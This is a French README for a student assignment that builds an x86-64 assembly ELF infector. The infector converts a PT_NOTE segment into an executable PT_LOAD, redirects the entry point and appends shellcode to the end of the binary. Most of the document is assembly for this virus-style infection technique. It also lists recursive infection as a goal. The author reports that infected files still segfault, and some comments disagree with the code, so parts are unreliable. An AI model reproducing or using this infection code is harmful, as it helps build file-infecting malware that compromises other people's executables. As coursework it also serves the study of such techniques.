
# ELF Infector

Projet ING3 de Shellcode.
Réalisation d'une infection ELF PT_NOTE --> PT_LOAD en asm

## Objectif

Infecter un fichier ELF en transformant un PT_NOTE en PT_LOAD afin de rendre exécutable un shellcode que l'on aura chargé en mémoire.

Pour ce faire:

On doit trouver un segment PT_NOTE, changer son `p_type` par 0x1 (PT_LOAD)

Modifier les permission du segment, `p_flags` par 0x1

Modifier l'offset `p_offset` du segment ainsi que `p_vaddr`

Ajouter notre sheelcode suffisamment loin en mémoire

Modifier `p_filesz` et `p_memsz` 

Ensuite on doit réécrire le header et changer `e_entry`

On doit par la suite réécrire notre segment phdr entièrement

Et puis finalement ajouter notre shellcode en fin de fichier 


## Plan
    1. Open the ELF file to be injected
    2. Parse the program header table, looking for a PT_NOTE segment
    3. Convert the PT_NOTE segment to a PT_LOAD segment
    4. Change the memory protections for this segment to allow executable instructions
    5. Change the entry point address to an area that will not conflict with the 
     original program execution.
    6. Adjust the size on disk and virtual memory size to account for the size of the 
     injected code
    7. Point the offset of our converted segment to the end of the original binary, 
     where we will store the new code
    8. Add our injected code to the end of the file
    9. Write the file back to disk

## 1. Open puis Read file

Utiliser les syscall adequat et vérifier que le code roule bien.

```asm
; syscall open, pour l'ouverture de notre fichier elf
        ; syscall open
        mov rax, 2                      ; open(
        lea rdi, [rel file_path]        ; int fd,  path de notre elf
        mov rsi, 2                      ;       ,O_RDONLY
        syscall                         ; )
        test rax, rax                   ; Check si le file est OK (rax==0)
        js _error_open                  ; Gestion d'erreur pour open
        mov r13, rax                    ; Si OK alors on met le fd dans r13 en attendant le syscall print
        call _ok_open

        ; Lecture du fichier
        ; syscall read
        mov rax, 0                      ; read(
        mov rdi, r13                    ; int fd,
        mov rsi, buffer                 ; void buf*, 
        mov rdx, buffer_size            ; size_t count
        syscall                         ; )
        ;       gestion erreur sys_read
        test rax, rax
        js _error_read
        call _ok_read

        ; On va stoquer le buffer dans R15 car quasiment jamais touché
        lea r15, [buffer]

```

Ensuite vérifier que c'est bien un fichier ELF

```asm
; Check si fichier ELF
        cmp dword  [r15], 0x464C457F
        ;       gestion erreur elf
        jne _error_elf
        call _ok_elf

```

## 2. Parsing jusqu'à trouver un PT_NOTE


Initialisation de quelques Registres  :

```bash
; On va prendre la taille du fichier avec sys_stat
        mov rax, 0x5                    ; fstat(
        mov rdi, r13                    ; int fd,
        mov rsi, stat                   ; void buf*
        syscall                         ; ) 

        mov r14, [stat+0x30]            ; On met la taille st_size dans r14
        mov r8, [r15+0x20]              ; e_phoff
        mov r9, [r15+0x36]              ; e_penthsize

```

On attaque le parsing ensuite

```bash
; On peut maintenant parser le programme header phdr
        xor rcx, rcx                    ; Initialise rcx
        xor rdx, rdx                    ; Initialise rdx
        mov cx, word [r15+0x38]         ; e_phnum
        mov rbx, qword [r15+0x20]       ; e_phoff
        mov dx, word [r15+0x36]         ; e_phentsize
        ; On cherche un PT_NOTE phdr
        call _loop_phdr

loop_phdr:
        add rbx, rdx                    ; on passe au prochain phdr
        dec rcx                         ; Decrémente le nombre de phdr
        cmp dword [r15+rbx], 0x4        ; On check si PT_NOTE (p_type == 0x4) 
        je _ok_pt_note                  ; On a trouver un PT_NOTE phdr
                ; Sinon on check si il reste des phdr a comparer
        ;       gestion des erreurs pour le parsing
        lea rsi, [rel error_pt_note_msg]
        mov rdx, error_pt_note_msg_len
        call _print_msg
        xor rdx,rdx
        mov dx, word [r15+0x36]
        cmp rcx, 0
        jg _loop_phdr                   ; On recommence jusqu'à trouver notre PT_NOTE
```

## 3/4/5/6/7. PT_NOTE --> PT_LOAD

```bash
ok_pt_note:
        lea rsi, [rel ok_pt_note_msg]
        mov rdx, ok_pt_note_msg_len
        call _print_msg                 ; Msg de succès
        mov dword [r15+rbx], 0x1        ; on transforme notre p_type en PT_LOAD
        mov dword [r15+rbx+0x4], 0x1    ; On accord permission RX à p_flags
        mov r12, [r15+rbx+0x8]          ; On sauvegarde l'offset pour ensuite réécrire le phdr
        mov qword [r15+rbx+0x8], r14    ; On met p_offset à EOF
        add r14, 0xc000000              ; On prend un large adresse et on l'ajoute à R13
        mov qword [r15+rbx+0x10], r14   ; On met p_vaddr suffisamment loin (grosse adresse) pour que ca n'interfere pas avec le code de base
        mov [r15+0x18], r14             ; de meme pour le header, on réécrit e_entry pour aller directement à OEF ou se situe notre shellcode
        mov qword [r15+rbx+0x20], shellcode_len  ; Taille de mon shellcode dans p_filesz
        mov qword [r15+rbx+0x28], shellcode_len  ; Taille de mon shellcode dans p_memsz
        mov qword [r15+rbx+0x30], 0x1000; Alignement des pages

``` 
## 8. Injection du shellcode à la fin du fichier


```bash

; On va aller à la fin du file EOF pour injecter notre shellcode avec sys_lseek
        mov rax, 0x8                    ; lseek(
        mov rdi, r13                    ; int fd,
        mov rsi, 0                      ; off_t offset,
        mov rdx, 2                      ; int origin 2=SEEK_END
        syscall                         ; )

        ; On écrit à OEF notre shellcode
        ; syscall write
        mov rax, 0x1                    ; write(
        mov rdi, r13                    ; int fd,
        mov rsi, shellcode              ; void buf*,
        mov rdx, shellcode_len          ; size_t count
        syscall                         ; )


```

## 9. Réécriture du fichier sur le disque

```bash
; On réécrit notre header, pour ça on retourne au début du fichier ou à e_phoff
        ; syscall sys_lseek
        mov rax, 0x8                    ; lseek(
        mov rdi, r13                    ; int fd,
        xor rsi, rsi                    ; off_t offset,
        mov rdx, 0x0                    ; int origin, 0=SEEK_SET
        syscall                         ; )
        ; syscall write
        mov rax, 0x1                    ; write(
        mov rdi, r13                    ; int fd,
        mov rsi, r15                    ; void buf*,
        mov rdx, 0x40                   ; size_t count
        syscall                         ; )

        ;       gestion erreur write header
        test rax, rax
        js _write_error_header
        cmp rax, 0x40
        jne _write_error_byte_size_header

        ; On réécrit notre phdr, pour ça on va se placer a l'endroit ou est notre PT_NOTE
        ; syscall sys_lseek
        mov rax, 0x8                    ; lseek(
        mov rdi, r13                    ; int fd,
        mov rsi, r12                    ; void buf*,
        mov rdx, 0x0                    ; int origin, 0=SEEK_SET
        syscall                         ; )

        xor rsi, rsi
        mov rsi, r15
        add rsi, rbx
        ; syscall write
        mov rax, 0x1                    ; write(
        mov rdi, r13                    ; int fd,
        mov rsi, rsi                    ; void buf*,
        mov rdx, r9                     ; size_t count
        syscall                         ; )

        ;       getion erreur write pheader
        test rax, rax
        js _write_error_phdr            ;
        cmp rax, r9                     ; On check si on a bien écrit la taille qu'on voulait
        jne _write_error_byte_size_phdr ; Si c'est pas le cas on saute à la gestion d'erreur
        call _exit

```
## Compilation


```bash
$ nasm -f elf64 elf_infector.asm -o elf_infector.o
$ ld elf_infector.o -o elf_infector     
$ ./elf_infector
```


## Etat actuel

- Open OK
- Read OK
- Parsing OK
- PT_NOTE -> PT_LOAD OK
- Segment transformer OK
- Application du shellcode en EOF OK
- Réécriture du Header OK
- Réécriture du Phdr OK

L'infector se lance correctement et n'effectue plus d'erreur.(voir gestion des erreurs dans le fichier)

J'ai aujourd'hui une erreur de segfault sur le fichier infecté.

D'après `readelf` je ne remarque rien.

La `ldd` à l'air ok aussi.

Après vérification avec `gdb` je sais que je ne me suis pas trompé de Segment, l'offset est correct.
Si l'offset est correct alors le changement de toutes entrées du Phdr sont censé être bon.

La taille du fichier est bonne avec `sys_fstat` donc l'offset pour OEF est OK.

Les `sys_lseek` on l'air d'être OK après vérification depuis `gdb`  

Je pense avoir eu un problème lors de l'écriture sur le disque.

Revoir le `e_entry`, c'est peut-être ici que ça a foiré.

## A revoir : 
- Réécriture du Header 
- Réécriture du Phdr 
- e_entry
- sys_lseek

## Problèmes rencontrer

Au départ, ce fut assez dur de se repérer dans la stack.

Beaucoup de mal à comprendre ce que faisaient certaines instructions.

Comme ce fut le premier projet en x86, je n'ai pas compris tout de suite que `RAX` était basiquement le registre de retour pour tout les sys_call

Se familiariser avec le langage n'a pas été facile car de très bas niveau.

Prendre en main les sys_call, j'ai du aller faire beaucoup d'aller-retour entre le `man` et `gdb` pour comprendre réellement ce que faisait chaque fonction.

En parlant de `gdb`, je n'avais clairement pas l'habitude d'utiliser un débogueur au début.

Les plus gros problèmes sont encore à ce jour :

Ce repérer avec `lseek()`: quand j'ai réécris mon header et mon segment, j'ai eu pas mal de problèmes à me situer correctement.


## Axes d'amélioration

Ce programme ne prend pas en charge les ELF-32bits pour le moment.

Prendre en charge les ELF en big-indian.

Pouvoir infecter un fichier en rentrant un argument dans l'exe (pour le moment, limiter à `/tmp/ls`)

Pouvoir infecter récursivement



## Documentation

[l'idée générale](https://tmpout.sh/1/2.html)

[elf infector en C](https://www.symbolcrash.com/2019/03/27/pt_note-to-pt_load-injection-in-elf/)

[ELF Header](https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html)

[Comment marche un ELF](https://www.wikiwand.com/en/articles/Executable_and_Linkable_Format)

[syscall](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)


## Authors

- [@Drien95](https://www.github.com/Drien95)

